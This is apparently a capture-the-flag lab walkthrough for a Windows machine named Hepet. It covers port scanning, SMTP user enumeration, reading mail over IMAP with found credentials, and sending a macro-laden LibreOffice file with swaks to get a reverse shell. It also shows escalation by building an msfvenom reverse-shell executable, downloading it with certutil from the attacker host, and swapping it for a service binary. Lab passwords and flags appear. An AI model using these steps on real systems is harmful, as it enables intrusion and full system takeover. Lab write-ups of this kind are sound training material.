# Hepet \[Inter]

## Report

Websites on port 443 and 8000 expose creds for user 'jonas' which is confirmed by SMTP enumeration \[Jonas K.] Use these credentials to read user's mail to find one that mentions all LibreOffice will be processed first which indicates use of malicious macros. Send .odt file via swaks and get reverse shell as 'Ela Arwel'.

PowerUp shows Weak permissions over service 'veyon.exe', replace with msfvenom payload and restart the system to get reverse shell as SYSTEM.

## Enumeration

192.168.171.140

```
PORT      STATE SERVICE        VERSION
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
|_pop3-capabilities: EXPIRE(NEVER) TOP APOP USER UIDL
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: complete IMAP4rev1 CAPABILITY AUTH=PLAIN X-MERCURY-1A0001 OK
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
|_http-title: Time Travel Company Page
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
| http-methods: 
|_  Supported Methods: GET HEAD
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-title: Time Travel Company Page
11100/tcp open  vnc            VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
```

#### SMB (445)

Nothing for now

```
nxc smb $ip -u guest -p '' --shares
SMB         192.168.171.140 445    HEPET            [*] Windows 10 / Server 2019 Build 19041 x64 (name:HEPET) (domain:hepet) (signing:False) (SMBv1:False)
SMB         192.168.171.140 445    HEPET            [-] hepet\guest: STATUS_ACCOUNT_DISABLED 
```

#### 8000 (HTTP) & 443 (HTTPS)

Directory fuzzing got us NOTHING

Get userlist and a phrase 'SicMundusCreatusEst' which feels like a password but user spraying has not worked

#### 2224 (HTTP)

Mercury mailing services

We can subscribe to lists here

prolly once we get creds subscribe here

#### VNC (11100)

We just know it's there, do we brute this?

### Files

#### 20001 (FTP)

Can't PUT files but download all

Find source for Vue.js blog but what tf do we do with this?

### Initial Foothold

That passphrase is the password for admin for mercury mail im calling it

if smb user spraying didnt work smtp should

{% hint style="info" %}
Liodeus

POP3 - 110\
Brute force
{% endhint %}

{% code title="SMTP user enumeration" %}
```
smtp-user-enum -M VRFY -U users -t 192.168.171.140 
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... users
Target count ............. 1
Username count ........... 66
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Mon Oct 20 02:44:28 2025 #########
192.168.171.140: charlotte exists
192.168.171.140: magnus exists
192.168.171.140: agnes exists
192.168.171.140: jonas exists
192.168.171.140: martha exists
######## Scan completed at Mon Oct 20 02:44:31 2025 #########

```
{% endcode %}

Read the mail to find this \[We got disabled on POP3 lmaooooo]

```
A1 login jonas SicMundusCreatusEst
A1 list "INBOX/" "*"
g21 SELECT "INBOX"

F1 fetch 5 RFC822 [5 mails that's why]
```

> Team,
>
> We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility.
>
> I will forward all the documents after checking everything is working okay.
>
> Sorry for the inconveniences.



```
sudo swaks --to mailadmin@localhost --from jonas@localhost --header 'Subject: Please check this spreadsheet' --header-X-Test "Header" --server 192.168.171.140  --attach @yess.ods
```

the @ next to file actually sent the file wtf how would we know that

## PrivEsc

Ela Arwel

```
DefaultUserName      : Ela Arwel
DefaultPassword      : LadderWheelGallon443
Check                : Registry Autologons
```

`. .\PowerUp.ps1; Invoke-AllChecks`

```
ServiceName                     : VeyonService
Path                            : C:\Users\Ela Arwel\Veyon\veyon-service.exe
ModifiableFile                  : C:\Users\Ela Arwel\Veyon\veyon-service.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : HEPET\Ela Arwel
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'VeyonService'
CanRestart                      : False
Name                            : VeyonService
Check                           : Modifiable Service Files
```

#### Replacing Current Service with our Malicious Exe

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=1338 -f exe -o rev.exe

PS C:\programdata> certutil -urlcache -f http://192.168.45.233/rev.exe rev.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\programdata> move "C:\Users\Ela Arwel\Veyon\veyon-service.exe" "C:\Users\Ela Arwel\Veyon\veyon-service.exe.bak"
PS C:\programdata> move rev.exe "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
PS C:\Users\Ela Arwel\Veyon> shutdown /r /t 0
```

## Loot

### Creds

`jonas:SicMundusCreatusEst`

`Ela Arwel:LadderWheelGallon443`

### Flags

`local:4d33de9f2bbb4e5fecb571a9bca37c4e`

`proof:a8c6cef912cd3244b302984b4bf09b0c`

## Proof

{% embed url="https://www.atmail.com/blog/imap-101-manual-imap-sessions/" %}
